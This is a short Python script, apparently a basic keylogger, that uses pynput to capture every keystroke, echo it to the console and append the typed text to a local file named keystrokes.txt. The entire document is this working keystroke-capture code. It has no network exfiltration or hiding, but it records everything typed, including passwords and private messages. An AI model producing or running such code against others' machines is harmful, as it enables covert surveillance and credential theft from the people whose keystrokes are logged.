from pynput import keyboard


def on_press(key):
    print(f"{key} was pressed!")


def on_release(key):
    with open("keystrokes.txt", "a") as f:
        if key == keyboard.Key.enter:
            f.write("\n")
        elif key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.backspace:
            pass
        else:
            f.write(str(key).strip("'"))

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
